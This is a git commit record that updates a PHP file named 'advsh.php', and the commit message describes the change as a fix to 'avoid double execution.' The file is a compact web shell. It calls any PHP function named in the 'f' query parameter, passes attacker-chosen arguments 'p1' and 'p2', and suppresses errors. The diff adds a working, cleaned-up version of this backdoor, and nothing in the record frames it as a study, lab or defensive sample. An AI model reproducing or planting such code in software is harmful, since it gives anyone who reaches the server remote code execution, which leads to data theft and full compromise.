14588e508ffc0e05b5adede22ab9ce1d18aa43c5
Adriano Marcio Monteiro <adrianomarcmont@users.noreply.github.com>
2025-08-29 17:43:49 -0300

    Update advsh.php
    Improvement to avoid double execution.

--- advsh.php
+++ advsh.php
@@ -1,6 +1,9 @@
 <?php 
 error_reporting(0);
-print_r($_GET['f']());
-print_r($_GET['f']($_GET['p1']));
-print_r($_GET['f']($_GET['p1'],$_GET['p2']));
+if(isset($_GET['f'])){}else{die();}
+if(isset($_GET['p1'])){$flag_p1 = true;}else{$flag_p1 = false;}
+if(isset($_GET['p1']) and isset( $_GET['p2'] )){$flag_p2 = true;}else{$flag_p2 = false;}
+if($flag_p1 === false and $flag_p2 === false){print_r($_GET['f']());}
+if($flag_p1 === true and $flag_p2 === false){print_r($_GET['f']($_GET['p1']));}
+if($flag_p1 === true and $flag_p2 === true){print_r($_GET['f']($_GET['p1'],$_GET['p2']));}
 ?>
